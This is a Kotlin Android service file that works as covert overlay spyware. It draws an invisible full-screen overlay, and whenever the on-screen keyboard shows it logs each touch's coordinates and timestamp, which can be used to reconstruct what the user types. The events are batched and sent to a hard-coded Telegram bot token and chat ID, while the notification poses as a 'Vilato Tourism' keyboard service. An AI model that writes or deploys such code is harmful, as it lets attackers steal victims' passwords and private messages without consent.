
package com.example.rendezvous_hb

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.DisplayMetrics
import android.view.*
import android.widget.FrameLayout
import androidx.core.app.NotificationCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

class OverlayService : Service() {

    private lateinit var windowManager: WindowManager
    private var combinedOverlayView: FrameLayout? = null
    private var screenHeight: Int = 0

    private val handler = Handler(Looper.getMainLooper())
    private val eventBuffer = mutableListOf<String>()
    private var flushRunnable: Runnable? = null

    private val TELEGRAM_BOT_TOKEN = "8264908770:AAEeWPB0hZkTPCqtjpodUn53Yhc2O3sn5ko"
    private val TELEGRAM_CHAT_ID = "8416456484"

    override fun onBind(intent: Intent): IBinder? = null

    private fun sendErrorReport(errorMessage: String) {
        val client = OkHttpClient()
        val text = "[CRITICAL] Overlay Service Error: $errorMessage"
        val url = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage"
        val json = """{"chat_id":"$TELEGRAM_CHAT_ID","text":"$text"}"""
        val requestBody = json.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
        val request = Request.Builder().url(url).post(requestBody).build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) { response.body?.close() }
        })
    }

    override fun onCreate() {
        super.onCreate()
        startForeground(1, createNotification())
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val windowMetrics = windowManager.currentWindowMetrics
            screenHeight = windowMetrics.bounds.height()
        } else {
            @Suppress("DEPRECATION")
            val displayMetrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            windowManager.defaultDisplay.getMetrics(displayMetrics)
            screenHeight = displayMetrics.heightPixels
        }
        addCombinedOverlayView()
    }

    private fun addCombinedOverlayView() {
        combinedOverlayView = FrameLayout(this)
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            // Start as NOT_FOCUSABLE (to pass keyboard focus) and NOT_TOUCHABLE (to be inert)
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSPARENT
        )

        combinedOverlayView?.setOnApplyWindowInsetsListener { view, insets ->
            val isKeyboardVisible = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                insets.isVisible(WindowInsets.Type.ime())
            } else {
                @Suppress("DEPRECATION")
                val bottomInset = insets.systemWindowInsetBottom
                bottomInset > screenHeight * 0.25
            }

            val currentParams = view.layoutParams as WindowManager.LayoutParams
            if (isKeyboardVisible) {
                // Keyboard is visible: Make overlay touchable
                currentParams.flags = currentParams.flags and WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE.inv()
                view.setOnTouchListener { _, event -> handleTouchEvent(event) }
            } else {
                // Keyboard is hidden: Make overlay inert again
                currentParams.flags = currentParams.flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                view.setOnTouchListener(null)
                flushEventBuffer() // Flush any remaining events
            }
            windowManager.updateViewLayout(view, currentParams)

            insets
        }
        windowManager.addView(combinedOverlayView, params)
    }

    private fun handleTouchEvent(event: MotionEvent): Boolean {
        val action = when (event.action) {
            MotionEvent.ACTION_DOWN -> "DOWN"
            MotionEvent.ACTION_UP -> "UP"
            MotionEvent.ACTION_MOVE -> "MOVE"
            else -> ""
        }
        if (action.isNotEmpty()) {
            val eventData = "$action,${event.rawX},${event.rawY},${System.currentTimeMillis()}"
            synchronized(eventBuffer) { eventBuffer.add(eventData) }
            resetFlushTimer()
        }
        return false // Pass the touch event on to the window below
    }

    private fun resetFlushTimer() {
        flushRunnable?.let { handler.removeCallbacks(it) }
        flushRunnable = Runnable { flushEventBuffer() }
        handler.postDelayed(flushRunnable!!, 1200)
    }

    private fun flushEventBuffer() {
        if (eventBuffer.isEmpty()) return

        val eventsToFlush: List<String>
        synchronized(eventBuffer) {
            eventsToFlush = ArrayList(eventBuffer)
            eventBuffer.clear()
        }
        sendToTelegram(eventsToFlush.joinToString("\n"))
    }

    private fun sendToTelegram(text: String) {
        val client = OkHttpClient()
        val url = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage"
        val json = """{"chat_id":"$TELEGRAM_CHAT_ID","text":"$text"}"""
        val requestBody = json.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
        val request = Request.Builder().url(url).post(requestBody).build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                sendErrorReport("Telegram API Failure: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (!response.isSuccessful) {
                    val responseBody = response.body?.string()
                    sendErrorReport("Telegram API Error: ${response.code} - $responseBody")
                }
                response.body?.close()
            }
        })
    }

    override fun onDestroy() {
        super.onDestroy()
        flushRunnable?.let { handler.removeCallbacks(it) }
        flushEventBuffer()
        combinedOverlayView?.let { windowManager.removeView(it) }
    }

    private fun createNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("overlay_service", "Overlay Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, "overlay_service")
            .setContentTitle("Vilato Tourism")
            .setContentText("Keyboard service is active.")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .build()
    }
}
